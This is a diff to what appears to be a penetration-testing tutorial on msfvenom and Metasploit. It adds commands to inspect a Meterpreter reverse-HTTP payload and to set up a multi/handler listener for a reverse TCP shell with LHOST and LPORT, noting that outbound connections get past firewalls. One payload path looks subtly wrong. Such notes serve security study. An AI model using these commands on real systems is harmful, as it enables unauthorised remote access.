@@ -9,7 +9,16 @@ With msfvenom we are able to create exploits that we can send to the target, and
 List exploits
 ```
 msfvenom -l
-`` `
+```
+
+Add the `--payload-options` to see the options
+```
+msfvenom -p windows/meterpreter_reverse_http --payload-options
+```
+
+
+
+
 
 ## Create exploit
 
@@ -26,5 +35,21 @@ So once an exploit is set we need to start to listen for it. We can do that usin
 ```
 use exploit/multi/handler
 ```
+
+Set what payload you want for the listening part
+```
+set payload exploit/meterpreter/reverse_tcp
+```
+
+Show options
+```
+show options
+set LHOST 192.168.1.101
+set LPORT 8080
+exploit
+```
+
+
+
 
 This does indeed bypass the firewall. Since the connection is initiated from the inside. A firewall normally (maybe older firewalls) only block incoming, and not outgoing connections.
